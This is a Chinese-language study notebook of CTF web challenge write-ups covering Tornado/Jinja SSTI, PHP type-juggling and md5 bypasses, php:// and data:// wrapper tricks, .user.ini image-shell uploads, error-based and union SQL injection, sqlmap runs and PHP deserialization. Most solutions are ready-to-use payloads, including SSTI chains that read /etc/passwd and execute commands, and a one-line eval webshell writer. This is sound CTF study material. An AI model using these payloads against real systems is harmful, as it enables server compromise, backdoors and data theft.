class IndexHandler(tornado.web.RequestHandler):  //制定类及方法
    def get(self):
        greeting = self.get_argument('greeting', 'Hello')   //获得GET参数值，前者是参数名，后面是默认值，必须
        self.write(greeting + ', welcome you to read: www.itdiffer.com')

if __name__ == "__main__":
    tornado.options.parse_command_line()   //启动命令行
    app = tornado.web.Application(handlers=[(r"/", IndexHandler)]) //实例化，handlers类似路由，列表里每个元素有两个参数，路径和处理它的类
    http_server = tornado.httpserver.HTTPServer(app)  //调用对象执行http服务器
    http_server.listen(options.port)  //提供发送响应的接口
    tornado.ioloop.IOLoop.instance().start()  //表示可以接收来自HTTP的请求了
```

**用python运行这个文件，其实就已经发布了一个网站**

- 而模板文件里，将`{{placeholder}}`理解为占位符，就是变量，看HTML模板代码中，有类似`{{username}}`的变量，模板中用`{% raw %}{{}}{% endraw %}`引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中
- 用`{% set var="python-tornado" %}`的方式，将一个字符串赋给了变量var，然后就可以直接引用这个变量了：{{var}}。这样就是实现了模板中变量的使用

##### SSTI

> [freebuf 从零学习flask模板注入**](https://www.freebuf.com/author/和蔼的杨小二)
>
> [csdn SSTI完全学习+工具Tplmap实例](https://blog.csdn.net/zz_Caleb/article/details/96480967)
>
> [csdn初识 SSTI 服务器端模板注入，有py2+py3的payload]( https://blog.csdn.net/Goodric/article/details/115170932?utm_source=app&app_version=4.20.0)
>
> [🛠模板注入，工具Tplmap**](https://github.com/epinna/tplmap)
>
> [源码+ctf例题：Python中从服务端模板注入到沙盒逃逸的源码探索 (一)](https://xz.aliyun.com/t/2908)

SSTI就是服务器端模板注入(Server-Side Template Injection)

- SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如<span style="background:#FF9999;">Python的jinja2(Flask) mako tornado django，php的smarty twig，java的jade velocity</span>。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。

###### XSS利用

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)   //python里的三引号指多行代码，%s指字符串，由变量code填充
    return render_template_string(html)
```

这段代码存在漏洞的原因是数据和代码的混淆。**代码中的`code`是用户可控的，会和html拼接后直接带入渲染**。

尝试构造code为一串js代码，会执行js，弹窗。

而以下代码：

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

js代码被原样输出了。**这是因为模板引擎一般都默认对渲染的变量值(猜测是`{% raw %}{{}}{% endraw %}`)进行编码转义，这样就不会存在xss了**。在这段代码中用户**所控的是code变量，而不是模板内容**。**存在漏洞的代码中，模板内容直接受用户控制的**。

不仅可以xss，还可以进行其他攻击

###### SSTI文件读取/命令执行

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

构造参数{{2*4}}，返回执行结果8，**可以看到表达式被执行了。**

那么可以**通过python的对象的继承、利用可用子类的方法来一步步实现文件读取和命令执行，具体看参考链接**

利用：【<span style="background:#FF9999;">因为位置可能不同，所以用if查找</span>】

- ==读文件：==

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}   //py2
还有:
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()

object.__subclasses__()[40](r'C:\1.php').read()

更保险：
 {% for c in [].__class__.__base__.__subclasses__() %}{% if
 c.__name__=='catch_warnings' %}{{
 c.__init__.__globals__['__builtins__'].open('在这里输入文件名', 'r').read()
 }}{% endif %}{% endfor %} 		//py3
```

- ==写文件==

```
//写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')
```

- ==命令执行==

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
}}
还有：
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

{% for c in [].__class__.__base__.__subclasses__() %}{% if
c.__name__=='catch_warnings' %}{{
c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}  	//py3
```

构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye)

<span style="background:#FF9999;">测试是否有注入点  {{1+1}} 之类的，成功执行则说明有模版注入</span>

###### 下划线被过滤？

可以用request.args获取get参数绕过

例如

```
http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=__class__&mro=__mro__&subclasses=__subclasses__&init=__init__&globals=__globals__&popen=popen&cmd=cat /flag

{{()[request.args.class][request.args.mro][-1][request.args.subclasses]()[127][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read() }}
```



#### 解题

flag in /fllllllllllllag

md5(cookie_secret+md5(filename))

针对报错界面的/error?msg=Error尝试模板注入

![image-20220227211937496](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png)

输入/error?msg={{2}}，返回2

![image-20220228210519796](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210519796.png)

/error?msg={{2*4}}，返回ORZ

![image-20220228210447911](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210447911.png)

`/error?msg={{4/2}}`，除和减也是返回ORZ，`/error?msg={{*}}`、`/error?msg={{_}}`也是返回ORZ，应该是过滤了特殊字符

###### 怎么找cookie_secret呢？

> [具体分析，源码](https://www.jianshu.com/p/c4070d6f4249)

查看wp发现**用的就是handler.settings对象**

1. 什么是cookie_secret? [tornado文档](https://tornado-zh.readthedocs.io/zh/latest/guide/security.html)里的部分源码：

```python
class MainHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self):
        name = tornado.escape.xhtml_escape(self.current_user)
        self.write("Hello, " + name)

settings = {
    "cookie_secret": "__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
    "login_url": "/login",
}
application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/login", LoginHandler),
], **settings)
```

 settings中的属性"cookie_secret"（应该是一个经过HMAC加密的够长且随机的字节序列）

settings又作为参数传入了Application类构造函数

**因此可以通过`self.application.settings`获取到cookie_secret**

2. RequestHandler类中的一个方法**将RequestHandler类本身赋值给了handler**，因此handler.settings实际上就是RequestHandler.settings（self.setting）【即`handler`就等于 [`RequestHandler`](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.tornadoweb.org%2Fen%2Flatest%2Fweb.html%23tornado.web.RequestHandler) 】
3. `RequestHandler.settings`别名 `self.application.settings`

4. 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以`handler.settings`就指向RequestHandler.application.settings了，这里面就是我们的一些***环境变量***

==简单而言通过`{{handler.application.settings}}`或者`{{handler.settings}}`就可获得`settings`中的**cookie_secret**。==





`/error?msg={{handler.settings}}`得到cookie_secret:9d1f67f0-bb20-4878-a71e-16da5ce18c57

![image-20220228211001182](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211001182.png)

❗注意，这个与抓包里的cookie无关

![image-20220228211146954](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211146954.png)



计算filehash:md5(cookie_secret+md5(filename))

```php
<?php
$a='9d1f67f0-bb20-4878-a71e-16da5ce18c57';
$b='/fllllllllllllag';
//echo $a.$b;
echo md5($a.md5($b));
```



payload：

```
/file?filename=/fllllllllllllag&filehash=f0c23d729e726f692178be3dda2f2b4b
```

![image-20220228211604055](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211604055.png)





## [极客大挑战 2019]BuyFlag（易）

#### 考点：弱类型比较、绕过数据长度限制、strcmp

点进菜单的payflag，提示:

```
If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!!
```

在源码里发现提示

```php
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

关于You must be a student from CUIT!!!，尝试修改referer不对，发现cookie：user=0，修改为CUIT也不对，修改为1，正确

![image-20220305161122799](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161122799.png)

绕过password：

```
password=404    ==》password can't be number
password='404'  ==》Wrong Password!!   ==》给的是部分php源码
password=404a   ==》Password Right!Pay for the flag!!!hacker!!!
```

根据Flag need your 100000000 money，猜测还有个参数money

```
password=404a&money=100000000  ==》Password Right!</br>Nember lenth is too long</br>
password=404a&money=100  ==>>Password Right!</br>you have not enough money,loser~</br>	
用科学计数法,1e10即1*10的10次方，大于等于9就能买了
password=404a&money=1e10  ==>>Password Right!</br>flag{fb7ec519-90e9-47d4-92cf-ba9b204eeb54}
```

> **在**[科学计数法](https://baike.baidu.com/item/科学计数法)**中，为了使公式简便，可以用带“E”的格式表示。当用该格式表示时，E前面的数字和“E+”后面要精确到十分位，（位数不够末尾补0）,例如7.8乘10的7次方，正常写法为：7.8x10^7,简写为“7.8E+07”的形式**

![image-20220305161955432](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161955432.png)

更多方法：

绕numeric的：

> ***is_numberic():就是判断括号里面的变量是不是数值***
> 漏洞绕过：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。

```
在后面加上%20跳过：404%20
```

绕money的：**长度有问题，应该是strcmp函数检测的**

> strcmp函数漏洞：strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值NULL，**NULL==0**，正是利用这点进行绕过

```
money[]可以绕开strcmp函数
```

## [ZJCTF 2019]NiZhuanSiWei

#### 考点：flle_get_contents() 、伪协议字符比较、反序列化echo tostring

#### php://

- **条件**：
  - `allow_url_fopen`:off/on
  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on

php://filter用于读取源码，php://input用于执行php代码。

| 协议         | 作用                                                         |
| ------------ | ------------------------------------------------------------ |
| php://input  | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，==在`enctype="multipart/form-data"` 的时候`php://input `是无效的。== |
| php://filter | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，**类似 `readfile()`、`file()` 和 `file_get_contents()`**，在数据流内容读取之前没有机会应用其他过滤器。 |

```
示例：
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php phpinfo(); ?>

写入一句话：
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```

#### date://

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

  - **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。
  - 用法：

  ```
  data://text/plain,
  data://text/plain;base64,
  http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
  ```

#### flle_get_contents() 

flle_get_contents() 函数,而这个函数是可以绕过的
绕过方式有多种:
●使用php://input伪协议绕过
	①将要GET的参数?xxx=php://input
	②用post方法传入想要file_get_contents() 函数返回的值
●用data://伪协议绕过
将url改为: ?xxx=data://text/plain;base64,想要 file_get_contents() 函数返回的值的base64编码
或者将url改为: ?xxx=data:text/plain,(url编码的内容)

==php://input和data://常在CTF里用来绕过一些判断语句;、file_get_contents()==

**总结：**

data://　　　　写入数据

php://input　　执行php

　　//filter　　查看源码



解题：index.php源码：

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){  //伪协议绕过
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php   通过伪协议filter读取文件源码
        $password = unserialize($password);  //反序列化触发wake_up，这里并不是这个考点
        echo $password;   //echo对象会触发tostring
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

用data://绕过file_get_contents，php://filter绕过include读取文件base64源码

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php&password=2
```

读到useless.php源码：

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){   //如果对象被当作字符串echo会触发这个方法
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

password反序列化读flag.php，

payload:构造序列化脚本：

```php
<?php
class Flag{
	public $file='flag.php';
} 
$flag = new Flag();
$flag_1 = serialize($flag);
echo $flag_1;
?>
```

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

查看源码得到flag

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307210749077.png" alt="image-20220307210749077" style="zoom:80%;" />



## [SUCTF 2019]CheckIn

#### 考点：nginx的.user.ini、图片头

关键点就是.user.ini与.htaccess的应用范围、.user.ini还需要同目录下存在一个可执行的php文件、上传图片马后url访问的不是图片地址，而是可执行php文件地址

> [参考WP](https://xz.aliyun.com/t/6091)

文件上传

1. 对后缀的过滤：php：不行，txt：可以，jpg：可以

2. 上传图片马：发现过滤<?，绕过:

   ```
   <script language=php>echo ‘123’;</script> 
   ```

3. 上传.htaccess也不行，必须是图片：改Content-Type: image/jpeg、后缀也不行（估计有图片头检验）

​	然后加上图片头：`GIF89A`，发现没警告了，但是并不能解析成php

**原因在于本题服务器是nginx不是apache**,（nginx要引用.htaccess也可以，但是还要进行某部分修改），这里显然不满足条件，所以没用。

#### .user.ini

![user.ini](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20190824211552-4c92f9fe-c671-1.png)

也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini

**大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）**，类似于在index.php中插入一句：`require(./a.jpg)`;【**类似.htaccess，只不过针对不同服务器**】

- 其中有两个配置，可以用来制造后门：
  auto_append_file、auto_prepend_file
  指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数.而auto_append_file类似，只是在文件后面包含

- 用法：

  直接写在.user.ini中：

  ```
  auto_prepend_file=test.jpg 或
  auto_append_file=test.jpg（当文件调用的有exit()时该设置无效）
  ```

  ![image-20220307214829826](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307214829826.png)

此时我们注意到上传目录下还有一个index.php，**我们正好需要该目录下有一个可执行php文件**，那这简直暴露了考点就是`.user.ini`，看来这个思路应该是可行的

上传`.user.ini`：

```
GIF89a
auto_prepend_file=shell.jpg
```

上传图片马：shell.jpg

```
GIF89a
<script language='php'>system('cat /flag');</script>
```

==最后，访问index.php，注意是可执行的php而不是访问上传的图片马！==

```
/uploads/cc551ab005b2e60fbdc88de809b2c4b1/index.php
```

#### .user.ini实战利用的可能性

综上所述`.user.ini`的利用条件如下：

1. 服务器脚本语言为PHP
2. 服务器使用CGI／FastCGI模式
3. 上传目录下要有可执行的php文件

***从这来看`.user.ini`要比`.htaccess`的应用范围要广一些，毕竟`.htaccess`只能用于Apache***

但仔细推敲我们就会感到**“上传目录下要有可执行的php文件”**这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。

但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测`../`，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用`.user.ini`

除此之外，把`.user.ini`利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下`.user.ini`和我们的图片马，这样就达到了隐藏后门的目的。



## [极客大挑战 2019]HardSQL

#### 考点：报错注入、空格=被过滤、截取部分字符串函数

关键点就是针对各种过滤，先利用burp爆破sql注入关键词字典，看哪些没有被过滤的，发现updatexml没有==>报错注入，然后针对被过滤的关键词找替代绕过，=》like，空格》()，and》^，然后针对updatexml、extractvalue的缺陷：只能返回32位数据，利用字符串截取函数截取剩下部分flag

> 参考：[**MySQL注入绕过WAF的基础方式**](https://www.freebuf.com/articles/web/264593.html)
>
> [**对MYSQL注入相关内容及部分Trick、绕过的归类小结**](https://xz.aliyun.com/t/7169#toc-30)

用sql关键词字典爆破，线程数调低点，发现过滤了=、union、by、！、&、|、*、空格【()、%0a绕过】、and、\、

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220308210613847.png" alt="image-20220308210613847" style="zoom:67%;" />

**但是！**没有过滤`updatexml`、extractvalue==》尝试报错注入

```
and、or、&&、||被过滤——可用运算符! ^ ~以及not xor来代替
空格被过滤——%09, %0a, %0b, %0c, %0d, %a0（等部分不可见字符可也代替空格）、and/or后面可以跟上偶数个!、~可以替代空格、改用+号、使用注释代替、多层括号嵌套
= -> like -> regexp -> <> -> in
```



#### 报错注入：

函数：

```
exp(~(select * from(select user())a))
updatexml(1,concat(0x7e,(select user()),0x7e),1)   //三个参数  0x7e:~
and (extractvalue(1,concat(0x7e,(select user()),0x7e)))   //两个参数
```

爆库名：

```
check.php?username=1&password='^(updatexml(1,concat(0x7e,(SELECT(@@version)),0x7e),1))%23
XPATH syntax error: '~10.3.18-MariaDB~'

check.php?username=1&password='^(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23
或1'^extractvalue(0x0a,concat(0x7e,(select(database()))))%23
XPATH syntax error: '~geek~'
```

爆表名：【注意select后一大串都需要括起来】

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))%23

XPATH syntax error: '~H4rDsq1'
```

爆列名：

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like('geek'))))%23

XPATH syntax error: '~id,username,password'
```

爆字段：

```
username=1&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))))%23

XPATH syntax error: '~1flagflag{1f077763-bd8b-4ef1-92'

extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23  //还是只回显一半，==》
XPATH syntax error: '~flag{1f077763-bd8b-4ef1-92d9-01'
```

**extractvalue()和updatexml()**只能回显==32位长度==的数据

**extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位**

#### 截取部分长度字符串函数：

| lefft(str,len)                  | 对指定字符串从最左边截取指定长度。                         |
| ------------------------------- | ---------------------------------------------------------- |
| right(str,len)                  | 对指定字符串从**最右边**截取指定长度                       |
| substr(str,N_start,N_length)    | 对指定字符串进行截取，为SUBSTRING的简单版。                |
| mid(column_name,start[,length]) | str="123456"   mid(str,2,1)  结果为2【类似string、substr】 |

```
1'^extractvalue(1,concat(0x7e,(select(right(password,15))from(H4rDsq1))))%23

XPATH syntax error: '~9-01edbdbb1804}'
```

拼接得到完整flag





## [MRCTF2020]Ez_bypass（容易）

#### 考点：md5强比较绕过、弱比较

```php
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {   //❗强等于，数组绕过即可
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)   //passwd=1234567a即可绕过
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');   //❗
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }
        }
        else{
            die('only one way to get the flag');  //passwd没赋值的情况
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

md5比较：

但是，强比较（===）不仅比较值，还比较类型，0e此时被当作字符串，所以不能用0e来进行绕过碰撞，只能用数组绕过，or ，找两个值不同但MD5相同的

```
md5(array()) = null
```

payload：

```
?gg[]=1&id[]=2
passwd=1234567a
```

## [GXYCTF2019]BabySQli（*）

#### 考点：手工+联合查询不存在数据构造虚拟数据绕过md5密码验证

关键点：对orderby后并不回显123而是验证用户名/密码正确与否，——绕过密码的md5验证：需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，**可以用联合查询语句用来生成虚拟的表数据覆盖原用户admin绕过**



点进去是登录框，然后name有注入点而pw没有！

sqlmap跑：发现是延时注入

```
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php --forms
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309120711794.png" alt="image-20220309120711794" style="zoom:67%;" />

跑库名 ：

```
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php --current-db --forms
web_sqli
```

跑表名：

```
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php -D web_sqli --tables --forms
user
```

爆数据

```
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php -D web_sqli -T user --dump --forms -C id
1
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php -D web_sqli -T user --dump --forms -C username
admin
sqlmap -u http://f41e9833-9c93-4b72-bb87-09fdedf1b5d7.node4.buuoj.cn:81/index.php -D web_sqli -T user --dump --forms -C passwd
cdc9c819c7f8be2628d4180669009d28
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309121646850.png" alt="image-20220309121646850" style="zoom:67%;" />

但是登录不上去，密码尝试md5破解也不行，base32加密再base64加密也不行【后续手工发现是hash了，但是没有告知盐，所以这里密码不能破解】

手工：

提交数据后跳转到search.php，源码看到注释提示，base64/md5都解不出来，一键解码工具

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122020599.png" alt="image-20220309122020599" style="zoom:80%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122033327.png" alt="image-20220309122033327" style="zoom: 67%;" />

解出SQL语句

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122102792.png" alt="image-20220309122102792" style="zoom:67%;" />

```
select * from user where username = '$name'
```

看来真是name存在注入

order被过滤：大小写字母就能绕过

```
name=1'Order by 3#&pw=2  ——wrong user!
name=1'Order by 4#&pw=2  ——Error: Unknown column '4' in 'order clause'——3列数据
```

然后`name=-'union select 1,2,3#&pw=2`发现回显**wrong user!**

而`name=-'union select 1,'admin',3#&pw=2`回显wrong pass

**那么就是先查询，查询不到数据则 ’ worry user’,再用查询出来的数据对比password，对比不符合则 ’ worry pass ’**

但当我们是测试admin用户时却回显wrong pass!(密码错误)，很明显这里绝对存在admin这个账号。此时，我们的思路就是登上admin用户或者得到admin的密码，但是密码是经过hash运算的，怎么得知/解密呢？



#### 新知识点：虚拟数据

> [参考WP](https://blog.csdn.net/qq_45521281/article/details/107167452)

 **当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据**

举个例子：如果users表中只有一行数据，我们通过union select查询就可以构造一行虚拟的数据，

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20200706211115507.png" style="zoom:80%;" />

**那么我们的思路就来了，我们可以利用联合查询来创建一行admin账户的续集数据，混淆admin用户的密码，将我们自定义的admin用户的密码（123）加进去，这样我们不就可以登录admin用户了吗。**

看到源码

```php
mysqli_query($con,'SET NAMES UTF8');
$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
$sql = "select * from user where username = '".$name."'";
// echo $sql;
$result = mysqli_query($con, $sql);
if(preg_match("/\(|\)|\=|or/", $name)){
	die("do not hack me!");
}
else{
	if (!$result) {
		printf("Error: %s\n", mysqli_error($con));
		exit();
	}
	else{
		// echo '<pre>';
		$arr = mysqli_fetch_row($result);
		// print_r($arr);
		if($arr[1] == "admin"){    //第二列数据要等于admin
			if(md5($password) == $arr[2]){   //第三列数据要等与密码的MD5
				echo $flag;
			}
			else{
				die("wrong pass!");
			}
		}
		else{
			die("wrong user!");
		}
	}
}
```

payload:

```
123456  md5:e10adc3949ba59abbe56e057f20f883e
name='union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309131226258.png" alt="image-20220309131226258" style="zoom:67%;" />



## [网鼎杯 2020 青龙组]AreUSerialz

#### 考点：反序列化构造、伪协议绕过file_get_contents、私有属性序列化后%00被拦截

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {        //4，要跳过写，直接读：op必须不满足===2，且满足==2
        if($this->op === "2") 
            $this->op = "1";  
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {    //  2
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))   //ord返回ASCII，21-125：可见字符
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];  //1
    if(is_valid($str)) { 
        $obj = unserialize($str);  //3
    }

}
```

整个流程：GET传参序列化字符串，满足ASCII有效后执行destruct函数，属性op不满足`===2`，满足`==2`，就会执行read函数，file_get_contents读取文件并返回结果

1. 一开始没想到file_get_contents，直接读了flag.php，发现不对，才反应过来**有file_get_contents**==》利用伪协议php://filter，读源码
2. 同时还要注意：==private属性序列化的时候格式是 %00类名%00成员名，自写脚本直接生成序列化字符串后还要手动加上%00==

构造脚本：

```php
<?php
class FileHandler {
    protected $op=2;
    protected $filename='php://filter/convert.base64-encode/resource=flag.php';
    protected $content;
}
$flag = new FileHandler();
$flag_1 = serialize($flag);
echo $flag_1;
```

```
再手动加上%00
O:11:"FileHandler":3:{s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:10:"%00*%00content";N;}
```

3. 然后发现又不对，**因为空字符的ASCII是0，不满足一开始的ASCII有效检验**，就不会往后执行，反序列化

   ```
   echo ord('');   //0
   ```

#### 如何绕过呢%00？

- **简单的一种是：php7.1+版本对属性类型不敏感，使用 public 修饰成员并序列化，反序列化后还是public——本地序列化的时候将属性改为public进行绕过即可**

构造脚本：

```
<?php
class FileHandler {

    public $op=2;
    public $filename='php://filter/convert.base64-encode/resource=flag.php';
    public $content;
}
$flag = new FileHandler();
$flag_1 = serialize($flag);
echo $flag_1;
```

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

<span style="background:#FF9999;">注意</span>：一开始我用的op="2a"，发现不行，因为要`不满足===且满足=="2"`，这里满足的是**弱等于字符串2，而不是数字2**

```
"2a"  ==  "2"  x
"2a"  ==   2   √
"2"   ==   2   √
```

然后成功读到flag.php的base64源码，解码得到flag

![image-20220312203106671](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312203106671.png)



## [GYCTF2020]Blacklist

> [参考wp](https://www.cnblogs.com/zzjdbk/p/13681752.html)
>
> [一些过滤技巧总结](https://xz.aliyun.com/t/7169#toc-47)

#### 考点：堆叠注入，类似强网杯、handler代替select查询

万能密码，爆出3个内容

```
1' or 1=1#
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212345118.png" alt="image-20220312212345118" style="zoom:50%;" />

查出来两个字段

```
?inject=1' order by 2--+
```

黑名单：

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

只回显一部分数据

```
?inject=1'union selec\at 1,2%23
er version for the right syntax to use near 'selec\at 1,2#'' at line 1
```

猜测可能是union被吞了：尝试双写，都不行

```
1'union union s\aelect 1,2%23
he right syntax to use near 'union s\aelect 1,2#'' at line 1
```

应该是检测到了union整个单词，然后报错，还是不行

```
1'u<>nion sel<>ect 1,2%23
t syntax to use near 'u<>nion sel<>ect 1,2#'' at line 1
```

**试试堆叠注入**：查看所有库名

```
1';show databases;   //这里1后必须要有单引号（字符注入），尾巴#可要可不要
```

